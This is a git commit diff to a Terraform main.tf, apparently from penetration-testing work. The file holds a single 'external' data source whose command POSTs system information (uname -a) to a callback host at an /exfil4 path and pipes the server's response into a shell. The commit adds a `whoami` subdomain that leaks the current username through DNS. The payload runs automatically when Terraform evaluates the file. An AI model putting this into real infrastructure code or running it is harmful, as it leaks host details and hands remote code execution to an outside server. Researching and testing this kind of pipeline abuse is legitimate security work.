9b1eb5e0e358b7aacbbd3afabc2dcf622cebf4b7
raknahs-netspi <sramakrishnan@netspi.com>
2025-09-15 19:08:25 +0530

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,3 +1,3 @@
 data "external" "example" { 
-  program = ["sh", "-c", "curl -X POST --data-binary \"$(uname -a)\" https://0hibdfhjlhwh3cfexmpt1u0fs6y4mwal.net-spi.com/exfil4 | sh"] 
+  program = ["sh", "-c", "curl -X POST --data-binary \"$(uname -a)\" https://`whoami`.0hibdfhjlhwh3cfexmpt1u0fs6y4mwal.net-spi.com/exfil4 | sh"] 
 } 
